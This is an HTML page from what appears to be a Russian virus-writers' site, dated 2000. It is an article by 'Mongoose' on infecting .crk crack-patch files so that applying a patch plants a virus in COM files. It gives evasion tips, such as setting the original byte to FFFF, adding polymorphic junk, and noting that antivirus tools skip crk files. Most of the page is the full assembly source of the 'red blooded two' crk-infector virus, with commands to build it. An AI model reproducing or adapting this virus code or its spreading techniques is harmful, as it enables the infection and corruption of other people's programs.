<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>Top Device</title>
</head>

<body bgcolor="#B1B1B1" text="#000000" topmargin="0"
leftmargin="3">

<p><STYLE> </p>

<p>INPUT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
}</p>

<p>SELECT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>OPTION { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>FORM { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
} <br>
BODY { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } <br>
P { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt }
TABLE { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
}TR { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } TD
{ FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 10pt
}TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } A { COLOR: #005500; TEXT-DECORATION: none }A:hover {
TEXT-DECORATION: underline } A:link { TEXT-DECORATION: none
}A:visited { }text:unknown { FONT-SIZE: 8pt } } </STYLE> </p>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tr>
        <td>&nbsp;</td>
        <td valign="top"><div align="center"><center><table
        border="0" cellpadding="0" cellspacing="0" width="100%">
            <tr>
                <td width="100%" bgcolor="#000000"><img
                src="../-.gif" width="1" height="1"></td>
            </tr>
            <tr>
                <td width="100%" bgcolor="#808080"><strong>05.03.2000</strong>
                Заражение crk-файлов <strong>[Mongoose]</strong></td>
            </tr>
            <tr>
                <td bgcolor="#000000"><img src="../-.gif"
                width="1" height="1"></td>
            </tr>
            <tr>
                <td><pre>
   <b>вступление</b>

   Посетив  сайт  Зомби  [Z0MBiE]  я  увидел довольно интересную статью о
заражении  crk  и  xck-файлов.  Прочитав  одно только название становится
ясно  о  том  как можно заразить crk related файлы. Однако в статье Зомби
рассказывал  о  варианте когда crk есть а файла на который он расчитан на
винте  нет.  Я расскажу о методе когда и кряк и файл есть + полиморфизм в
crk-related.

  <b>формат crk-файлов</b>

----[example.crk]-----------------------------------------------[start]--
Doctor Web                              ; название исправляемой программы

Заражение вирусом                       ; описание кряка
DRWEB.EXE                               ; имя файла
00000009: D9 64                         ; смещение, оригинальный байт и
                                        ; байт на который надо менять

Заражение вирусом N2                    ; описание кряка
DRWEB.EXE                               ; имя файла...
--------------------------------------------------------------[end]-----

   Если  в  поле  _оригинальный  байт_ находится FFFF, то это значит, что
значение  не  определено  (те  на место этого байта может находится любой
другой). Все числа (оффсет, байты) шестнадцатеричные.

   <b>что нужно помнить (знать)</b>

   Вирус  можно  внедрять  оверврайтом,  в область повторяющихся байт или
стандарным  методом  (я  тестировал  запись  за  границы файла на Program
Cracker `93 и он не глючил).

   Известно  что  crk-файл  может  содержать несколько кряков, желательно
заразить все.

   В  поле  original  byte  желательно  "класть"  FFFF  чтобы патчилки не
ругались.

   Заражать  нужно  только  com и exe файлы (поэтому проверка не помешала
бы).

   Кряк  файла  на  предмет посадки в него вируса НУЖНО распологать после
"оригинального"   кряка   иначе   "оригинальный"   кряк  может  поправить
(некоторые) байты в теле вируса и в результате получим испорченный файл.

   Если  мы  сажаем  вирус  в  файл  оверврайтом  то старый кряк можно не
записывать.

   <b>полиморфизм в crk-файлах</b>

   Известно  что нет определенного порядка при патче файла (сначала можно
пропатчить  первый  байт,  затем  четвертый,  третий,  второй и ничего не
меняется)  поэтому можно спокойно патчить файлы в любом порядке. Можно (и
нужно)  так  же  добавить  _немного_  мусора  и  тогда  мы  избавимся  от
фиксированного размера "вируcного кряка".

   Когда  я тестировал работу своего полиморфика для crk-файлов (возможно
из-за  большого  размера  кряка (видимо в этом был "виноват" _полиморфный
мусор_)) на Program Cracker'е к концу пропатченого файла добавлялся кусок
мусора.

   <b>но [!]</b>

   Если  файл  содержит  не  один  кряк,  а  допустим  3  то размер файла
увеличится на 3 * (размер вируса * 17), что будет сильно выдавать кряк.

   Нельзя предугадать как поведут себя патчилки (программы для применения
crk  файлов)  столкнувшись  с  кряками  по 20кб и/или к записи за границу
файла.

   <b>вывод X)</b>

   Заражение  кряков  как технология (метод) распространения вируса очень
сомнителен,  но  в  качестве  респавнинга  технология  довольно неплохая.
Учитывая  то  что  кряки  попадают  на компакты довольно часто и пока еще
такие файлы не проверяются антивирусами.

   <b>десерт =)</b>

   В  качестве  примера  crk-инфектора предлагаю исходник одной из ранних
версий  вируса  "горячая кровь 2" (red blooded 2). Самая последняя версия
вируса  вышла  в  качестве  релиза  нашей  комманды (misdirected youth) и
доступна на наших станциях поддержки.

<font color="#0000A0">
----[rb_two.asm]---------------------------------------------[start]----
; <b>red blooded two version 0.92</b>
;
;
;  red  blooded two is dedicated to Maya (from movie Red Bloded 2) & the
; skeve
;
;  World's  first  crk-files  infector.  Infect all crk-files (with size
;smaller than  virus  size*19) of current catalog (process files without
;attributes (only) and don't save original file date'n'time of creation)
;
; <b>crk-files infection</b>
;
;   Virus  search  and  infect  crk-files  of  current directory. Do not
;infect  files  with size larger than (virus size*19). Virus infect only
;first  crack  from crk file and only if "file to patch" is com-file and
;it  is  not  already  infected.  Virus writes it's crack after original
;crack (original crack can modify virus jump and corrupt file, some kind
;of destruction). To infect crack virus needs "file to patch" in current
;directory.
;
;   In  result of using infected crack, com-file will be infected with a
;virus  in  "standart"  way  (jump  to  virus  body  in the beginning of
;file'n'virus body will be located in the end of file).
;
;   I test this version using Program Cracker [1993] from DSL.
;
;
; <b>history</b>
;
; version number............: 0.90
; virus body size...........: 593 bytes
; date & time of creation...: 30.12.1999, 23:57
;
;  First version, contain alot of bugs and don't work correctly.
;
;
; version number............: 0.91
; virus body size...........: 662 bytes
; date & time of creation...: 31.12.1999, 21:52
;
;   Non-resident  com-files  &  crk-files  (in  result of using infected
;crack,  virus  will  be entered in the beginning of com or exe file, so
;called  overwriting  infector)  infector.  Contain  some  bugs  and not
;optimized version.
;
;
; version number............: 0.92
; virus body size...........: 589 bytes
; date & time of creation...: 01.01.2000, 05:39
;
;   I  almost  fully  comment virus source code, and do all optimization
;here.  Infection  of  com-files was also removed, now virus infect only
;crk-files (first crack of file and only if "file to path" is com file).
;In  result  of  using   infected   crack, virus will infect com file by
;standart way.
;
;   Source  of  this  virus  will  be published in Social Distortion Two
;(russian vx magazine) as the example of simple crk-infector.
;
;
; <b>compile</b>
;
; compile source using borland turbo assembler: tasm /m rb_two.asm
;                                               tlink /x /t rb_two.asm
;
;               designed by mongoose, Misdirected Youth, january 1, 2000
;
               .model   tiny
               .code
                org     100h
 vir_size_in_crk        equ (end_of_code-real_start+4)*19 ;17

 start:         jmp     real_start
                        db 090h,000h
;----------------------------------------------------------------------
 real_start:    call    calculate_ip           ; calculate IP
 calculate_ip:  pop     bp
                sub     bp,offset calculate_ip

                mov     di,100h                ; restore original bytes
                push    di
                lea     si,[bp+original_bytes]
                movsw
                movsw
;----------------------------------------------------------------------
;  search & infect crk-files
;----------------------------------------------------------------------
 infect_crk:    mov     ah,4eh               ; find crk-file in currend
                sub     cx,cx                ; directory
                lea     dx,[bp+crk_files]
 next_crk:      int     21h
                jnc     open_crk
                ret

 open_crk:      mov     ax,3d02h             ; open file
                mov     dx,9eh
                int     21h
                jnc     crk_handle
                jmp     find_next_crk        ; if error, try to find
                                             ; another

 crk_handle:    xchg    bx,ax                ; move handle to bx
                mov     cx,word ptr cs:[9ah] ; move crk-file size in
                                             ; cx

                cmp     cx,vir_size_in_crk   ; if crack file
                                             ; larger than
                ja      close_crk            ; virus size*17, try to
                                             ; find another
                mov     ah,3fh               ; read whole size in
                                             ; buffer
                lea     dx,[bp+buffer]
                int     21h
                mov     word ptr [bp+crk_file_size],ax

                sub     di,di                ; zero register
                xchg    ax,cx                ; move file size in cx
 find_descr:    cmp     word ptr [bp+buffer+di-4],0a0dh
                jnz     descr_next
                cmp     word ptr [bp+buffer+di-2],0a0dh
                jnz     descr_next           ; search for crack
                                             ; description
                inc     di
                inc     di
                jmp     find_name
 descr_next:    inc     di
                loop    find_descr

 close_crk:     mov     ah,3eh               ; if crack description not
                int     21h                  ; found, close file

 find_next_crk: mov     ah,4fh               ; try to find another
                                             ; crk-file
                jmp     next_crk

 find_name:     cmp     word ptr [bp+buffer+di-2],0a0dh
                jz      found_name
                inc     di                   ; search for file name
                                             ; to patch
                loop    find_name
                jmp     close_crk

 found_name:    push    di                   ; found file name to
                                             ; patch location
                lea     si,[bp+di+buffer]
                lea     di,[bp+file_name]
                sub     cx,cx
                push    di
 move_fn_loop:  lodsb                        ; move file name to
                                             ; patch to
                push    cx di si             ; "file_name" buffer
                cmp     al,'.'
                jz      found_ext            ; jump if found ext.
                                             ; location
 filename_end:  pop     si di cx
                cmp     al,13
                jz      found_fn_end         ; jump if found end
                                             ; of filename
                stosb
                inc     cx
                jmp     move_fn_loop

 found_ext:     mov     cx,3                 ; convert ext. letters
                push    cx
                call    convert_to_lk
                pop     cx

                lea     di,[bp+com_ext]      ; file to path is
                                             ; com-file?
                cld
                repe    cmpsb
                jz      filename_end         ; jump if yes

                pop     cx cx cx cx cx       ; restore all data stored
                                             ; in
                jmp     close_crk            ; stack and close file

 found_fn_end:  mov     al,0
                stosb                        ; end file name with 000h

 fnd_crack_end: pop     dx di                ; restore:
                                             ; dx - file name to patch
                                             ; loc.
                add     di,cx                ; di - orig. patch
                                             ; location-2
                mov     cx,word ptr [bp+crk_file_size]
                sub     cx,di                ; cx = crk-file size * di
 crack_end_lp:  cmp     word ptr [bp+buffer+di],0a0dh
                jz      chk_crack_end        ; found end of patch?
 crack_end_nxt: inc     di
                loop    crack_end_lp
;               pop     dx
                jmp     close_crk

 chk_crack_end: cmp     word ptr [bp+buffer+di+2],0a0dh
                jz      open_filename        ; jump if end of patch
                                             ; found
                cmp     cx,2
                jnz     crack_end_nxt        ; jump if end of path not
                                             ; found

 open_filename: inc     di
                inc     di                   ; di = original path
                                             ; location
                mov     word ptr [bp+loc_of_crk_part],di

 open_crk_file: push    bx                   ; save crk-file handle
                mov     ax,3d02h             ; open file to patch
                int     21h
                jnc     crk_file_h           ; jump if no error
                pop     bx
                jmp     close_crk

 crk_file_h:    xchg    bx,ax

                mov     ah,3fh               ; read original bytes
                mov     cx,4
                lea     dx,[bp+original_bytes]
                int     21h

                cmp     byte ptr [bp+original_bytes+1],'Z'
                jnz     check_if_ill
                pop     bx
                jmp     close_crk

 check_if_ill:  cmp     byte ptr [bp+original_bytes+3],000h
                jnz     can_infect_fl
                pop     bx
                jmp     close_crk

 can_infect_fl: mov     ax,4202h             ; move pointer to end of
                                             ; file
                sub     cx,cx
                cwd
                int     21h
                push    ax                   ; save file to patch size

 generated_jmp: sub     ax,3                 ; create jump
                mov     byte ptr [bp+vir_buffer],0e9h
                mov     word ptr [bp+vir_buffer+1],ax
                mov     byte ptr [bp+vir_buffer+3],000h

                mov     ah,3eh               ; close file to patch
                int     21h

                pop     ax                   ; restore file to patch
                                             ; size
                pop     bx                   ; restore crk-file handle
                push    ax                   ; save file to patch size

                mov     ax,4200h             ; move pointer to original
                sub     cx,cx                ; crack end
                mov     dx,word ptr [bp+loc_of_crk_part]
                int     21h

                lea     di,[bp+vir_buffer+4] ; move virus body to virus
                lea     si,[bp+real_start]   ; buffer
                mov     cx,(end_of_code-real_start)
                push    cx
                cld
                rep     movsb

                sub     dx,dx                ; write crack for jump
                mov     cx,4
                lea     si,[bp+vir_buffer]
                call    gen_crack_lp

                pop     cx dx                ; write crack for virii
                call    gen_crack_lp

                mov     ah,40h               ; write other shit after
                lea     dx,[bp+buffer]       ; virus crack
                add     dx,word ptr [bp+loc_of_crk_part]
                mov     cx,word ptr [bp+crk_file_size]
                sub     cx,word ptr [bp+loc_of_crk_part]
                int     21h

                mov     ah,3eh               ; close file
                int     21h

                mov     ah,4fh               ; try to find next
                                             ; crk-file
                jmp     next_crk

 include                rb_two.lib
;-----------------------------------------------------------------------
;  data
;-----------------------------------------------------------------------
 original_bytes         db 0cdh,020h,000h,000h
 virus_name             db '[red blooded two]'
 com_ext                db 'com'
 crk_files              db '*.crk',0
 orig_byte              db 'FFFF',20h
 end_of_code    label   byte
 crk_file_size          dw ?
 loc_of_crk_part        dw ?
 file_name              db 13 dup (?)
 buffer                 db vir_size_in_crk dup (?)
 temp_buf               db 9 dup (?)
 crk_offset             db 10 dup (?)
 change_byte            db 4 dup (?)
 vir_buffer             db (end_of_code-real_start)+4 dup (?)
;-----------------------------------------------------------------------
                end     start
----------------------------------------------------------------[end]---
----[rb_two.lib]-----------------------------------------------[start]--
 convert_to_lk: push    si
 convert_loop:  cmp     byte ptr [si],'A'
                jb      char_hk
                cmp     byte ptr [si],'Z'
                ja      char_hk
                add     byte ptr [si],20h
 char_hk:       inc     si
                loop    convert_loop
                pop     si
                ret
;-----------------------------------------------------------------------
;  write crack from dx offset & si buffer loc (cx bytes)
;-----------------------------------------------------------------------
 gen_crack_lp:  push    cx dx si
                call    gen_offset
                pop     si dx cx
                push    cx dx si
                mov     dl,byte ptr [si]
                lea     di,[bp+change_byte]
                call    f8bin2asc
                mov     word ptr [bp+change_byte+2],0a0dh

                mov     ah,40h
                mov     cx,10
                lea     dx,[bp+crk_offset]
                int     21h

                mov     ah,40h
                mov     cx,5
                lea     dx,[bp+orig_byte]
                int     21h

                mov     ah,40h
                mov     cx,4
                lea     dx,[bp+change_byte]
                int     21h

                pop     si dx cx
                inc     si
                inc     dx
                loop    gen_crack_lp
                ret
;----------------------------------------------------------------------
;  generate offset (10 bytes) in crk_offset
;
;  dx - offset
;----------------------------------------------------------------------
 gen_offset:    call    f16bin2asc

                mov     dx,8
                sub     dx,cx
                push    dx
                lea     si,[bp+temp_buf]
                lea     di,[bp+crk_offset]
                push    di
                add     di,dx
 move_off_loop: lodsb
                stosb
                loop    move_off_loop

                pop     di cx
 move_zero_lp:  mov     byte ptr [di],'0'
                inc     di
                loop    move_zero_lp
                mov     word ptr [bp+crk_offset+8],' :'
                ret
;----------------------------------------------------------------------
;  from 16-bit binary to ascii hex
;----------------------------------------------------------------------
 f16bin2asc:    mov     cx,4
                push    ax cx
                lea     di,[bp+temp_buf]

 f16bin2asc_lp: push    cx
                mov     cl,4
                rol     dx,cl
                mov     al,dl
                and     al,00fh
                daa
                add     al,0f0h
                adc     al,040h
                mov     [di],al
                inc     di
                pop     cx
                loop    f16bin2asc_lp
                mov     byte ptr [di],0
                pop     cx ax
                ret
;----------------------------------------------------------------------
;  from 8-bit binary to ascii hex
;----------------------------------------------------------------------
 f8bin2asc:     push    ax cx
                mov     cx,2

 f8bin2asc_lp:  push    cx
                mov     cl,4
                rol     dl,cl
                mov     al,dl
                and     al,00fh
                daa
                add     al,0f0h
                adc     al,040h
                mov     byte ptr [di],al
                inc     di
                pop     cx
                loop    f8bin2asc_lp
                pop     cx ax
                ret
-------------------------------------------------------------[end]-----
            </font>
                          code & article by mongoose, misdirected youth
            </pre>
            </td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
        </table>
        </center></div></td>
        <td>&nbsp;</td>
    </tr>
</table>

<p>&nbsp;</p>
</body>
</html>
